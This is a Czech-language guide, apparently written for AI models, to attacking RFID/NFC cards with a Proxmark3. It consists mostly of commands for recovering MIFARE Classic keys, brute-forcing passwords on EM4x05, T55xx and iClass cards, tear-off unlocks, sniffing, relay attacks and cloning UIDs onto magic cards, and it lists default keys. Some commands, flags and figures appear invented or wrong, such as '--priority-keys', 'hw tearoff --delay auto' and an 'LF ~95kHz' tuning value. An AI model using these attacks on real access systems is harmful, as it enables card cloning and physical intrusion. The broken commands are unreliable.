# Proxmark3 - Kompletní návod pro analýzu neznámých karet

## Úvod

Tento dokument poskytuje systematický přístup k analýze neznámých RFID/NFC karet pomocí Proxmark3. Návod je strukturován pro snadné pochopení AI a LLM modely a obsahuje kompletní metodologii od základní identifikace po pokročilé útoky.

## 1. ZÁKLADNÍ IDENTIFIKACE KARTY

### 1.1 Automatická detekce
```bash
# Detekce HF karet (13.56 MHz)
hf search

# Detekce LF karet (125 kHz)  
lf search

# Kombinovaná detekce
auto
```

### 1.2 Manuální identifikace podle frekvence

#### HF (13.56 MHz) karty:
```bash
# ISO14443-A (MIFARE)
hf 14a info
hf 14a reader

# ISO14443-B
hf 14b info
hf 14b reader

# ISO15693
hf 15 info
hf 15 reader

# FeliCa
hf felica info

# iClass/PicoPass
hf iclass info
```

#### LF (125 kHz) karty:
```bash
# EM410x
lf em 410x_read

# HID Prox
hf hid read

# T55xx
lf t55xx detect
lf t55xx info

# EM4x05/EM4x50
lf em 4x05_info
lf em 4x50_info
```

## 2. ANALÝZA PODLE TYPU KARTY

### 2.1 MIFARE Classic

#### Základní informace:
```bash
hf 14a info
hf mf info
```

#### Detekce typu PRNG:
```bash
hf mf hardnested t 1 000000000000
```

#### Útoky na klíče:

**A) Darkside útok (slabý PRNG):**
```bash
hf mf darkside
```

**B) Nested útok (známý klíč):**
```bash
hf mf nested 1 0 A FFFFFFFFFFFF d
```

**C) Hardnested útok (silný PRNG):**
```bash
hf mf hardnested 0 A FFFFFFFFFFFF 4 A
```

**D) Dictionary útok:**
```bash
hf mf chk *1 ? d
```

**E) Autopwn (automatický):**
```bash
hf mf autopwn
```

### 2.2 MIFARE Ultralight/NTAG

#### Základní analýza:
```bash
hf mfu info
hf mfu dump
```

#### Generování hesel z UID:
```bash
hf mfu pwdgen -r
```

#### Testování známých hesel:
```bash
# Výchozí hesla
hf mfu dump -k FFFFFFFF
hf mfu dump -k 00000000

# Algoritmy založené na UID
hf mfu dump -k [Transport_EV1_pwd]
hf mfu dump -k [Amiibo_pwd]
hf mfu dump -k [Lego_pwd]
hf mfu dump -k [Xiaomi_pwd]
```

#### Tear-off útoky (MIK640M2D):
```bash
hf mfu otptear
```

### 2.3 MIFARE DESFire

#### Základní analýza:
```bash
hf mfdes info
hf mfdes enum
```

#### Testování výchozích klíčů:
```bash
hf mfdes auth -n 0 -t AES -k 00000000000000000000000000000000
hf mfdes auth -n 0 -t 3DES -k 000000000000000000000000
```

### 2.4 iClass/PicoPass

#### Základní analýza:
```bash
hf iclass info
hf iclass dump
```

#### Útoky na klíče:
```bash
hf iclass chk f iclass_default_keys.dic
hf iclass loclass
```

## 3. POKROČILÉ TECHNIKY ÚTOKU

### 3.1 Tear-off útoky

#### Obecný tear-off:
```bash
# Nastavení zpoždění
hw tearoff --delay [ms]

# Kombinace s příkazy
hw tearoff --delay 2000
hf 14a raw -a -p -b 7 -c 4000
```

#### Specifické tear-off útoky:
```bash
# EM4x05 unlock
lf em 4x05_unlock

# ATA5577C
lf t55xx dangerraw

# MIFARE Ultralight OTP
hf mfu otptear
```

### 3.2 Sniffing a replay útoky

#### Sniffing komunikace:
```bash
# HF sniffing
hf 14a sniff
hf 14b sniff

# LF sniffing  
lf em 4x05_sniff
lf t55xx sniff
```

#### Analýza zachycených dat:
```bash
# Zobrazení trace
trace list
trace save -f captured_data.trace
```

### 3.3 Brute force útoky

#### MIFARE Classic:
```bash
# Brute force sektorových klíčů
hf mf fchk 1 ? t

# Paralelní brute force
hf mf fchk 1 ? t --threads 4

# Brute force s custom range
hf mf fchk 1 ? --range 000000000000:FFFFFFFFFFFF
```

#### EM4x05 hesla:
```bash
lf em 4x05_brute
lf em 4x05_chk

# Brute force s custom slovníkem
lf em 4x05_chk f custom_passwords.dic
```

#### iClass:
```bash
hf iclass chk f dictionary.dic

# Elite key calculation
hf iclass calcnewkey
```

### 3.4 Relay útoky

#### MIFARE Classic relay:
```bash
# Nastavení relay módu
hf 14a raw -a -p -c 5000  # Wakeup
# Přenos komunikace mezi čtečkou a kartou
```

#### NFC relay útoky:
```bash
# Použití s externím NFC zařízením
hf 14a raw -a -p -t 1000 -c [data]
```

### 3.5 Downgrade útoky

#### MIFARE Plus downgrade:
```bash
# Pokus o downgrade na Classic
hf mfp info
hf mfp auth -k [key]
```

#### DESFire downgrade:
```bash
# Testování starších protokolů
hf mfdes info --legacy
```

## 4. SPECIFICKÉ ÚTOKY PODLE VÝROBCE

### 4.1 NXP karty

#### MIFARE Classic Chinese clones:
```bash
# Detekce Chinese magic cards
hf 14a info
# Hledej "CUID" nebo nestandartní odpovědi

# Magic card commands
hf mf csetuid [UID]
hf mf csetblk 0 [data]
hf mf cgetblk 0
```

#### NTAG213/215/216:
```bash
# Specifické NTAG útoky
hf mfu info
hf mfu pwdgen -r  # Generování hesel z UID

# NTAG tear-off (pokud podporováno)
hw tearoff --delay 2000
hf mfu wrbl -b [block] -d [data]
```

### 4.2 Infineon karty

#### my-d move/my-d move NFC:
```bash
# Specifické příkazy pro my-d
hf 14a raw -a -p -c 1B[password]
```

### 4.3 EM Microelectronic

#### EM4x02/EM4x05/EM4x50:
```bash
# EM4x05 specifické útoky
lf em 4x05_info
lf em 4x05_unlock  # Tear-off unlock
lf em 4x05_brute   # Password brute force

# EM4x50 útoky
lf em 4x50_info
lf em 4x50_brute
```

### 4.4 Atmel/Microchip

#### ATA5577/T5577:
```bash
# T55xx tear-off útoky
lf t55xx dangerraw
lf t55xx info
lf t55xx detect

# Password recovery
lf t55xx bruteforce
```

## 5. METODOLOGIE ANALÝZY NEZNÁMÉ KARTY

### Krok 1: Základní identifikace
1. Spusť `hf search` a `lf search`
2. Zaznamenej všechny detekované protokoly
3. Identifikuj hlavní typ karty
4. Zkontroluj hardware tune: `hw tune`

### Krok 2: Detailní analýza
1. Použij specifické `info` příkazy
2. Zaznamenej UID, ATQA, SAK, ATS
3. Identifikuj výrobce a model
4. Analyzuj memory layout

### Krok 3: Testování výchozích konfigurací
1. Testuj výchozí klíče/hesla
2. Použij dictionary útoky
3. Testuj známé algoritmy
4. Zkontroluj známé vulnerability

### Krok 4: Pokročilé útoky
1. Implementuj tear-off útoky
2. Použij sniffing techniky
3. Aplikuj brute force metody
4. Testuj side-channel útoky

### Krok 5: Dokumentace
1. Zaznamenej všechny nálezy
2. Vytvoř dump souborů
3. Dokumentuj použité techniky
4. Vytvoř reprodukovatelný postup

## 5. BEZPEČNOSTNÍ ALGORITMY A JEJICH SLABINY

### 5.1 CRYPTO1 (MIFARE Classic)
- **Slabiny**: Slabý PRNG, korelace v keystream
- **Útoky**: Darkside, Nested, Hardnested
- **Detekce**: Analýza PRNG pomocí `hf mf hardnested t`

### 5.2 AES (MIFARE DESFire, NTAG)
- **Slabiny**: Implementační chyby, výchozí klíče
- **Útoky**: Dictionary, side-channel
- **Detekce**: Testování známých klíčů

### 5.3 3DES (MIFARE DESFire, Ultralight-C)
- **Slabiny**: Krátká délka klíče, výchozí hodnoty
- **Útoky**: Brute force, dictionary
- **Detekce**: Analýza autentifikačních sekvencí

## 6. AUTOMATIZOVANÉ SKRIPTY

### 6.1 Lua skripty pro automatizaci:
```lua
-- Automatická analýza karty
function analyze_unknown_card()
    -- HF detekce
    core.console("hf search")
    -- LF detekce  
    core.console("lf search")
    -- Výsledky
    return results
end
```

### 6.2 Python skripty:
```python
#!/usr/bin/env python3
# Automatická analýza s PM3
import subprocess

def analyze_card():
    # Spuštění PM3 příkazů
    result = subprocess.run(['pm3', '-c', 'hf search'], 
                          capture_output=True, text=True)
    return result.stdout
```

## 7. ZNÁMÉ HESLA A KLÍČE

### 7.1 MIFARE Classic výchozí klíče:
```
FFFFFFFFFFFF (tovární)
000000000000 (prázdný)
A0A1A2A3A4A5 (NXP)
D3F7D3F7D3F7 (NDEF)
```

### 7.2 MIFARE Ultralight algoritmy:
```
Transport EV1: UID-based calculation
Amiibo: Nintendo algorithm  
Lego Dimensions: Specific algorithm
Xiaomi: Air purifier algorithm
```

### 7.3 iClass výchozí klíče:
```
AFA785A7DAB33378 (HID default)
```

## 8. COUNTERMEASURES A OCHRANA

### 8.1 Detekce útoků:
- Monitoring neobvyklých přístupů
- Analýza timing útoků
- Detekce tear-off pokusů

### 8.2 Ochranná opatření:
- Změna výchozích klíčů/hesel
- Implementace rate limiting
- Použití silnějších algoritmů
- Hardware ochrana proti tear-off

## 9. TROUBLESHOOTING A ŘEŠENÍ PROBLÉMŮ

### 9.1 Časté problémy a řešení:

#### Karta se nečte:
```bash
# Zkontroluj hardware
hw status
hw tune

# Testuj různé vzdálenosti
# Zkus různé orientace karty
# Zkontroluj napájení: hw version
```

#### Timeout chyby:
```bash
# Upravit timeout parametry
hf 14a raw -a -p -t 5000 -c 5000

# Zkontroluj RF pole
hw tune
# Optimální hodnoty: LF ~95kHz, HF ~13.56MHz
```

#### Neúspěšné útoky:
```bash
# Zkus různé pozice na anténě
# Změň vzdálenost karty
# Testuj s různými timing parametry

# Pro tear-off útoky:
hw tearoff --delay [různé hodnoty]
```

#### PRNG detekce selhává:
```bash
# Použij více pokusů
hf mf hardnested t 1 000000000000 --tests 50

# Zkus různé sektory
hf mf hardnested t [0-15] 000000000000
```

### 9.2 Debug techniky:

#### Verbose diagnostika:
```bash
# Detailní výstup
hf 14a info -v
hf mf info -v

# Trace analýza
trace list -t mf
trace list -t 14a
trace save -f debug_trace.trace
```

#### Hardware diagnostika:
```bash
# Kompletní hardware check
hw status
hw version
hw tune
hw dbg -l 4  # Vysoký debug level
```

#### Komunikační problémy:
```bash
# Test komunikace
hw ping
# Restart komunikace
hw connect
# Změna baudrate
hw baudrate 115200
```

### 9.3 Specifické chyby:

#### "No card found":
1. Zkontroluj napájení karty
2. Testuj s jinou kartou
3. Zkontroluj anténu: `hw tune`
4. Restartuj Proxmark3

#### "Authentication failed":
1. Zkontroluj klíče v dictionary
2. Testuj výchozí klíče
3. Použij různé typy útoků
4. Zkontroluj timing

#### "Tear-off failed":
1. Upravit delay: `hw tearoff --delay [ms]`
2. Zkus různé pozice karty
3. Testuj s různými kartami
4. Zkontroluj napájení

### 9.4 Performance optimalizace:

#### Rychlejší útoky:
```bash
# Více vláken pro hardnested
hf mf hardnested --threads 8

# Paralelní dictionary útoky
hf mf chk *1 ? d --parallel

# Optimalizované timing
hw tearoff --delay auto
```

#### Memory management:
```bash
# Vyčištění trace bufferu
trace clear

# Restart PM3 při memory issues
hw reboot
```

## 10. POKROČILÉ TECHNIKY PRO AI/LLM

### 10.1 Strukturovaný přístup k analýze:
```json
{
  "card_analysis": {
    "basic_info": {
      "uid": "string",
      "type": "string",
      "frequency": "HF|LF",
      "protocol": "string"
    },
    "security": {
      "encryption": "none|CRYPTO1|AES|3DES",
      "authentication": "required|optional|none",
      "default_keys": ["key1", "key2"]
    },
    "attacks": {
      "applicable": ["darkside", "nested", "tearoff"],
      "success_rate": "percentage",
      "time_estimate": "seconds"
    }
  }
}
```

### 10.2 Decision Tree pro výběr útoku:
```
Neznámá karta
├── HF detekována?
│   ├── ANO → ISO14443-A?
│   │   ├── ANO → MIFARE Classic?
│   │   │   ├── ANO → Testuj PRNG → Slabý? → Darkside
│   │   │   │                    └── Silný? → Hardnested
│   │   │   └── NE → MIFARE Ultralight? → Testuj hesla
│   │   └── NE → Testuj ISO14443-B, ISO15693
│   └── NE → LF detekována?
│       ├── ANO → EM410x? → Klonování
│       │      └── T55xx? → Tear-off
│       └── NE → Neznámý protokol
```

### 10.3 Automatizované rozhodování:
```python
def select_attack_strategy(card_info):
    if card_info['type'] == 'MIFARE_Classic':
        if card_info['prng'] == 'weak':
            return ['darkside', 'nested']
        else:
            return ['hardnested', 'dictionary']
    elif card_info['type'] == 'MIFARE_Ultralight':
        return ['password_gen', 'dictionary', 'tearoff']
    elif card_info['type'] == 'EM4x05':
        return ['tearoff', 'bruteforce']
    else:
        return ['dictionary', 'default_keys']
```

## 11. TIMING A OPTIMALIZACE ÚTOKŮ

### 11.1 Tear-off timing optimalizace:
```bash
# Automatické hledání optimálního timing
for delay in $(seq 1000 100 5000); do
    hw tearoff --delay $delay
    result=$(hf mfu wrbl -b 3 -d 00000000)
    if [[ $result == *"success"* ]]; then
        echo "Optimal delay: $delay ms"
        break
    fi
done
```

### 11.2 Hardnested optimalizace:
```bash
# Použití více vláken pro rychlejší útok
hf mf hardnested 0 A FFFFFFFFFFFF 4 A --threads 8
```

### 11.3 Dictionary útoky s prioritizací:
```bash
# Seřazené podle pravděpodobnosti úspěchu
hf mf chk *1 ? d --priority-keys
```

## 12. FORENSNÍ ANALÝZA A DOKUMENTACE

### 12.1 Kompletní forensní dump:
```bash
# Vytvoření kompletního záznamu
echo "=== FORENSIC ANALYSIS REPORT ===" > analysis_report.txt
echo "Date: $(date)" >> analysis_report.txt
echo "Device: Proxmark3 RDV4" >> analysis_report.txt

# Základní info
hf search >> analysis_report.txt 2>&1
lf search >> analysis_report.txt 2>&1

# Hardware info
hw status >> analysis_report.txt 2>&1
hw tune >> analysis_report.txt 2>&1

# Detailní analýza podle typu
if [[ $(hf 14a info) == *"MIFARE"* ]]; then
    hf mf info >> analysis_report.txt 2>&1
    hf mf dump >> analysis_report.txt 2>&1
fi
```

### 12.2 Metadata extrakce:
```bash
# Extrakce všech dostupných metadat
hf 14a info -v | grep -E "(UID|ATQA|SAK|ATS)" > metadata.txt
```

## 13. SIDE-CHANNEL ÚTOKY

### 13.1 Power analysis:
```bash
# Monitoring spotřeby během operací
hw dbg -l 4  # Vysoký debug level
hf 14a raw -a -p -c A000000000
# Analýza timing patterns
```

### 13.2 Electromagnetic analysis:
```bash
# Použití externí antény pro EM analýzu
hw antenna external
# Monitoring EM emisí během kryptografických operací
```

## 14. MACHINE LEARNING INTEGRACE

### 14.1 Pattern recognition:
```python
import numpy as np
from sklearn.cluster import KMeans

def classify_card_behavior(timing_data):
    """Klasifikace karty podle timing patterns"""
    kmeans = KMeans(n_clusters=3)
    clusters = kmeans.fit_predict(timing_data)
    return clusters
```

### 14.2 Automated key prediction:
```python
def predict_keys(uid, card_type):
    """Predikce klíčů na základě UID a typu karty"""
    if card_type == "MIFARE_Classic":
        # Implementace ML modelu pro predikci
        return predicted_keys
```

## 15. REFERENCE A ZDROJE

### 15.1 Primární zdroje:
- Proxmark3 RRG GitHub: https://github.com/RfidResearchGroup/proxmark3
- MIFARE dokumentace: NXP datasheets
- Quarkslab RFID research: https://blog.quarkslab.com/
- Proxmark3 community: https://forum.proxmark.org/

### 15.2 Akademické publikace:
- "EEPROM: It Will All End in Tears" - SSTIC 2021
- "RFID Security" - Kasper & Schindler
- "Dismantling MIFARE Classic" - de Koning Gans et al.

### 15.3 Nástroje a databáze:
- MIFARE Classic Tool (MCT)
- NFC TagInfo
- RFIDIOt
- Chameleon Ultra

### 15.4 Slovníky klíčů:
- mfkeys.dic - MIFARE Classic klíče
- iclass_default_keys.dic - iClass klíče
- t55xx_default_pwds.dic - T55xx hesla

---

**DŮLEŽITÉ UPOZORNĚNÍ**:
Tento návod je určen výhradně pro:
- Vzdělávací účely
- Bezpečnostní výzkum
- Testování vlastních systémů
- Penetrační testování s explicitním povolením

Nepoužívejte tyto techniky na cizí majetky bez povolení. Porušení může být trestné podle místních zákonů.
